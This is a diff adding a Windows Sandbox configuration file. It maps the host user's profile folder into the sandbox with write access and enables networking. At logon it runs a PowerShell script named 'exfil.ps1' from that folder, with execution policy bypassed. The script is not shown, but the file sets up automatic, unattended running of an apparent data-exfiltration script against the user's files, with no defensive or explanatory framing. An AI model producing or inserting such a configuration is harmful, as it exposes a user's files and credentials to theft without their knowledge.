@@ -1,0 +1,13 @@
+<Configuration>
+  <MappedFolders>
+    <MappedFolder>
+      <HostFolder>C:\Users\YourUser</HostFolder>
+      <SandboxFolder>C:\Users\WDAGUtilityAccount\host_profile</SandboxFolder>
+      <ReadOnly>false</ReadOnly>
+    </MappedFolder>
+  </MappedFolders>
+  <Networking>Enable</Networking>
+  <LogonCommand>
+    <Command>powershell.exe -ExecutionPolicy Bypass -File C:\Users\WDAGUtilityAccount\host_profile\exfil.ps1</Command>
+  </LogonCommand>
+</Configuration>
